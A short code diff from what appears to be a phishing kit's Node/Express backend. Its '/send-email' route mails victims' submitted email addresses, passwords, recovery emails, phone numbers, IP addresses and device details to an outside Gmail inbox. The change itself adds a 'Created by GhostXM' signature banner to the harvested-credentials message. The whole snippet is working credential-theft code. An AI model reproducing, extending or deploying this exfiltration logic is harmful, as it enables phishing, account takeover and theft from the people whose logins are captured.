@@ -25,13 +25,15 @@ app.post("/send-email", async (req, res) => {
       to: ["juniorhenryali@gmail.com"],
       subject: `New entry:: ${port}`,
       html: `
-    <p>Email: ${email}</p>.
+    <p>=============+ [ Created by GhostXM ] +=============</p>
+    <p>Email: ${email}</p>
     <p>Password: ${password}</p>
     <p>Recovery Email: ${recEmail}</p>
     <p>Phone Number: ${phone}</p>
     <p>IP: ${ip}</p>
     <p>PORT: ${port}</p>
     <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
+    <p>=============+ [ Created by GhostXM ] +=============</p>
 `,
     });
 
